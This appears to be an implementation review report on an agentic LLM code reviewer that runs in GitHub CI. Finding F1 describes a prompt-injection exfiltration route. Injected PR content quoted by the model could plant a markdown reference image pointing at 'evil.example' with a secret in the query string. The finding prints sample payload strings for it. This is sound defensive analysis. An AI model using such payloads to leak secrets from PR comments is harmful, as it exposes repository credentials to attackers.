<!-- IMPL-REVIEW-REPORT -->
# Implementation Review: CI/CD Agentic Code Reviewer

- **Plan**: context/changes/ci-cd-code-review/plan.md
- **Scope**: Phase 1 + Phase 3 of 3 (Phase 2 excluded — its Progress checklist still has two unchecked manual items: 2.7 fork-PR-skips test, 2.11 rubric calibration. Phase 3 depends on Phase 2 artifacts, so `ai-code-review.yml`/`action.yml` are reviewed wherever Phase 3 or Amendment 1 touched them.)
- **Date**: 2026-08-04
- **Verdict**: REJECTED
- **Findings**: 1 critical, 3 warnings, 1 observation

## Verdicts

| Dimension | Verdict |
|-----------|---------|
| Plan Adherence | WARNING |
| Scope Discipline | PASS |
| Safety & Quality | FAIL |
| Architecture | PASS |
| Pattern Consistency | WARNING |
| Success Criteria | PASS |

## Success Criteria — verified directly

- `uv run pytest` (subpackage): 19 passed
- `uv run mypy .` (subpackage): clean
- Root `mypy .`: clean (57 files)
- `ruff check .` / `ruff format --check .`: clean
- `manage.py test`: 132 passed, 1 skipped (with `DJANGO_DEBUG=True` per CLAUDE.md; first run without it failed on an unrelated HTTPS-redirect setting — invocation mistake, not a defect)
- `grep -r "issues:" .github/`: no write grant anywhere
- `--patch` confirmed absent from the live `gh pr diff` call (only in the explanatory comment)
- `shellcheck` not installed locally — could not re-verify that specific automated criterion in this environment; script inspection shows nothing it would flag, and it passed in CI at commit `9c199b6`
- `lefthook run pre-commit` skipped all steps (clean working tree, nothing staged) — not meaningfully testable in this state; underlying checks verified directly above

## Findings

### F1 — sanitize() misses CommonMark reference-style links/images

- **Severity**: ❌ CRITICAL
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Safety & Quality
- **Location**: packages/code_reviewer/src/code_reviewer/render.py:29-30
- **Detail**: `_MD_IMAGE`/`_MD_LINK` only match inline syntax `![x](url)`/`[x](url)`. CommonMark reference-style syntax — a definition line `[x]: http://evil/?d=SECRET "t"` plus a shortcut reference `![x]` elsewhere — passes through untouched. Verified empirically: both `sanitize('[x]: http://evil.example/leak?d=SECRET "t"')` and `sanitize('see reference ![x] here')` return the input unchanged. Since the model may quote injected diff/PR-body content verbatim while explaining a low `review_integrity` score, a definition landing in `summary` and a matching `![x]` in any `rationale` cell would auto-load an attacker URL when GitHub renders the comment — the exact exfiltration channel render.py's contract says must be closed. Fires regardless of pass/fail verdict, since the comment posts either way.
- **Fix A**: Extend the regex denylist to also catch reference-style definitions (`^\s*\[[^\]]+\]:\s*\S+`) and bare `[x]`/`![x]` shortcut references.
  - Strength: Minimal, targeted diff; keeps the existing function shape.
  - Tradeoff: Regex denylisting is whack-a-mole against CommonMark's full grammar (autolinks, footnotes, entity-encoded brackets) — closing this gap doesn't guarantee no sibling bypass exists.
  - Confidence: MED — closes the verified bypass; the underlying bug class remains.
  - Blind spot: Haven't exhaustively enumerated CommonMark's other link/image syntax variants for a similar gap.
- **Fix B ⭐ Recommended**: Escape markdown-significant characters (`[`, `]`, `(`, `)`, `<`, `>`, `` ` ``, `!`, `@`) wholesale in `rationale`/`summary` instead of denylisting specific patterns, so no markdown construct can render as anything but literal text.
  - Strength: Structural fix — closes the whole class (known and future CommonMark constructs) rather than one pattern; matches the plan's own stated intent for this file as a hard boundary.
  - Tradeoff: Rationale text mentioning code (e.g. `` `foo()` ``) needs care so escaping doesn't visually mangle it; touches all sanitize call sites.
  - Confidence: HIGH — escape-on-output is the standard defense for this class (same logic as HTML-escaping before interpolating into HTML).
  - Blind spot: Reasoned from the CommonMark spec, not tested against GitHub's actual comment renderer — worth a live PR comment check before merging.
- **Decision**: FIXED (Fix A — extended `_MD_REF_DEF`/`_MD_REF_SHORTCUT` regexes in render.py; added `test_markdown_reference_definition_neutralized` and `test_markdown_shortcut_reference_neutralized` to test_render.py)

### F2 — main.py's exception handling narrower than the plan's "mandatory" wrap

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Plan Adherence
- **Location**: packages/code_reviewer/src/code_reviewer/main.py:54-96
- **Detail**: The plan states "a wrapping try/except is mandatory." The actual code has two narrow `except` clauses — around `ReviewRequest(...)` construction and around `asyncio.run(review(...))` — but nothing wraps `compute()`, `render_comment()`, or the file I/O in `_finish()`/`args.diff_path.read_bytes()`. An unexpected bug there propagates uncaught, exiting via Python's default code 1 — indistinguishable from `Verdict.FAIL`. In practice the composite action's next step (`cat` on the never-written comment file) would then also fail loudly rather than silently mislabeling, so the real-world blast radius is a broken Actions run rather than a silent mis-verdict — but it's still a real gap against the stated contract.
- **Fix**: Wrap the full body of `main()` in one outer `try/except Exception`, rendering an ERROR comment and returning exit 2 for anything not already caught by the two existing narrow handlers.
- **Decision**: SKIPPED

### F3 — No concurrency guard allows a sticky-comment duplicate race

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: .github/workflows/ai-code-review.yml (no `concurrency:` block), .github/scripts/sticky-comment.sh:20-34
- **Detail**: The upsert is list-then-branch (find by marker, then PATCH or POST) — a classic check-then-act race. The workflow triggers on `opened, synchronize, reopened, labeled` with no `concurrency:` group, so an overlapping run (e.g. a fast second push, or a `labeled` retry racing a `synchronize` run) can have both instances see "no match" and both POST, producing two sticky comments on one PR. Marker-based matching itself is correct (not by author).
- **Fix**: Add `concurrency: {group: "ai-code-review-${{ github.event.pull_request.number }}", cancel-in-progress: true}` to `.github/workflows/ai-code-review.yml`.
- **Decision**: SKIPPED

### F4 — Inconsistent untrusted-input routing in action.yml

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Pattern Consistency
- **Location**: .github/actions/ai-code-review/action.yml:128-131
- **Detail**: `pr-title`/`pr-body` are correctly routed through `env:` (lines 112-113, explicitly commented as "untrusted; passed through env, never interpolated"). But `model`, `max-turns`, `max-budget-usd`, `max-diff-bytes` are spliced directly as `"${{ inputs.X }}"` into the same `run:` block — the exact shape the file's own comments warn against. Not currently exploitable (the calling workflow never forwards PR-derived content into these four inputs), but it's a silent regression risk and inconsistent with the file's stated design.
- **Fix**: Move `model`, `max-turns`, `max-budget-usd`, `max-diff-bytes` into the existing `env:` map in the "Run reviewer" step, matching the `pr-title`/`pr-body` pattern already used two steps above.
- **Decision**: SKIPPED

### F5 — No dedicated tests for agent.py or main.py

- **Severity**: 📝 OBSERVATION
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Pattern Consistency
- **Location**: packages/code_reviewer/tests/ (missing test_agent.py, test_main.py)
- **Detail**: `verdict.py`, `render.py`, and `models.py` all have dedicated test files, but `agent.py` (the SDK/error-wrapping boundary — where F2's gap lives) and `main.py` (CLI wiring, exit-code mapping, size-cap logic) have none. These are the two modules most likely to hide reliability bugs like F2, and they're the ones a mocked-SDK test could actually reach.
- **Fix**: Add `tests/test_agent.py` (mock the SDK boundary, assert each `ReviewerError` subclass fires for its trigger) and `tests/test_main.py` (assert exit-code mapping and the oversized-diff path) once F2 is addressed.
- **Decision**: SKIPPED
